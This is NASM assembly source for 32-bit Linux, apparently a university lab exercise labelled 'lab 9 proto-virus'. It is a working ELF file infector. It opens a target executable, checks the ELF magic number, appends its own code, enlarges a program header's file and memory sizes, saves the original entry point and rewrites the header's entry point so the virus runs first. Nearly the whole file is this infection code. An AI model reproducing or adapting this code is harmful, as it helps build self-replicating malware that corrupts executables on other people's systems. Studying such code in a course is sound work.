%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3	
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define FileSize [ebp - 196]	
	global _start

	section .text
_start:
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES ; Set up ebp and reserve space on the stack for local storage
	call get_my_loc
	sub ecx, next_i - OutStr
	write 1, ecx, 32
	open FileName, RDWR, 0;last is unused
	cmp eax, -1
	jz FailedExit
	mov esi, ebp
	sub esi, 0x38 ; [ebp-38] = ELF Header
	mov [ebp-4], eax; [ebp-4]=file descriptor
	read eax, esi, 0x34
	cmp eax, 0
	jl FailedExit
	;;check if this is ELF File
	cmp dword[esi], 0x464c457f ; magic numbers
	jz isELF
	;;Not Elf File
	write 1, Failstr, 13
	jmp Failed
	isELF:
	;;find Program Headers location in file
	lseek [ebp-4], 0x34, SEEK_SET
	mov esi, ebp
	sub esi, 0x78 
	;;load Program Headers to memory 
	read [ebp-4], esi, 0x40 
	mov edi, dword[esi+0x8]
	;;Get file size and save to FileSize = [ebp - 196]
	lseek [ebp-4], 0, SEEK_SET
	lseek [ebp-4], 0, SEEK_END
	cmp eax, -1
	jz FailedExit
	mov dword FileSize, eax
	;;Load Virus code to end of file
	write [ebp-4], _start, (virus_end - _start)
	push esi
	mov esi, ebp
	sub esi, 0x38-ENTRY ;get original entry point
	lseek [ebp-4], -4, SEEK_END
	write [ebp-4],esi,4 ;save original entry point to end of file aka PreviousEntryPoint
	pop esi
	;;form this point the Virus and the original entry point are in the end of the original file
	lseek [ebp-4], 0, SEEK_SET
	lseek [ebp-4], 0, SEEK_END
	cmp eax, -1
	jz FailedExit
	;;check if this is a big file or a small file 
	cmp eax, 4000
	jl noChange
	;;Handle a file with size over 4k bytes
	mov ecx, dword[esi+0x20+0x4]
	add dword[esi+0x20+0x10], (virus_end -_start)  
	add dword[esi+0x20+0x14],(virus_end -_start) 
	mov edi, dword[esi+0x20+0x8]
	sub edi, dword[esi+0x20+0x4]
	lseek [ebp-4], 0x34, SEEK_SET
	write [ebp-4], esi, 0x40
	noChange:
	mov eax, dword FileSize
	add edi, eax
	mov dword[ebp-0x20], edi ;;rewrite entry point in memory
	lseek [ebp-4], 0, SEEK_SET ;;go to start of file
	cmp eax, -1
	jz FailedExit
	mov esi, ebp 
	sub esi, 0x38 ;points to header in memory
	write [ebp-4], esi, 0x34 ;write over Original ELF header with the modified one
	jmp VirusExit
	
	
	

; You code for this lab goes here

VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
FailedExit:
	call get_my_loc
	sub ecx, next_i - PreviousEntryPoint
	jmp [ecx]
Failed:
	 exit 1
get_my_loc:
	call next_i
next_i:
	pop ecx
	ret
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
PreviousEntryPoint: dd VirusExit
virus_end:


